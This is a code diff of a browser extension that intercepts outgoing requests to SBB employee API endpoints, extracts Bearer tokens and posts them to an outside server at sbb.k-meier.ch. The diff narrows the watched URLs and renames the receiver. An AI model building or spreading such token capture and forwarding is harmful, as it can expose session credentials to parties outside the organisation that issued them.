@@ -1,6 +1,9 @@
 // Monitor both specific URLs
-const TARGET_URLS = ['https://tip2.sbb.ch/*', 'https://sopreweb-tourenplan-api.app.sbb.ch/*'];
-const RECEIVER_ENDPOINT = 'https://sbb.k-meier.ch/api/save-token';
+const TARGET_URLS = [
+	'https://tip2.sbb.ch/rest/mitarbeiter/*',
+	'https://sopreweb-tourenplan-api.app.sbb.ch/mitarbeiter/check*'
+];
+const RECEIVER_ENDPOINT = 'https://sbb.k-meier.ch/api/token';
 
 console.log(
 	'SBB Utility Extension Loaded. Listening for outgoing requests to extract Bearer tokens...'
@@ -76,7 +79,9 @@ async function processToken(newToken) {
 					// Adjust the header name ('x-api-key') to match what your server expects!
 					Authorization: `Bearer ${apiKey}`
 				},
-				body: JSON.stringify({ token: newToken })
+				body: JSON.stringify({
+					token: newToken
+				})
 			});
 
 			if (response.ok) {
